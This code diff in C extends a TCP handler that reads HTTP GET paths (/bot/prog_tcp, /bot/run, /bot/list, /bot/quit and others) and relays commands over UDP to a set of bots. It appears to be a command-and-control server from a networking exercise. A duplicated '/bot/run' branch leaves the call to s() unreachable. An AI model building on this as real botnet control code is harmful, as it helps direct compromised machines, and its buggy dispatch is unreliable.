@@ -404,13 +404,51 @@ void process_tcp(int tcp_sock, int udp_sock, struct bot *bots, int *number_of_bo
     char *delim = " ";
     
     char *ptr = strtok(buf, delim);
-    
+
     if(!strcmp(ptr, "GET")){
-        printf("DOSO BOTCE\n");
-        
-        w_send(tcp_sock, ptr, strlen(ptr), 0);
+        w_send(clifd, ptr, strlen(ptr), 0);
 
         ptr = strtok(NULL, delim);
+
+        if(!strcmp(ptr, "/bot/prog_tcp")){
+            pt(udp_sock, bots, number_of_bots);
+        }
+        
+        else if(!strcmp(ptr, "/bot/prog_tcp_localhost")){
+            ptl(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/prog_udp")){
+            pu(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/prog_udp_localhost")){
+            pul(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/run")){
+            r(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/run2")){
+            r2(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/run")){
+            s(udp_sock, bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/list")){
+            l(bots, number_of_bots);
+        }
+
+        else if(!strcmp(ptr, "/bot/quit")){
+            q(udp_sock, bots, number_of_bots);
+            *quit_flag = true;
+        }
+
+        else{
+        }
     }
 
     close(clifd);
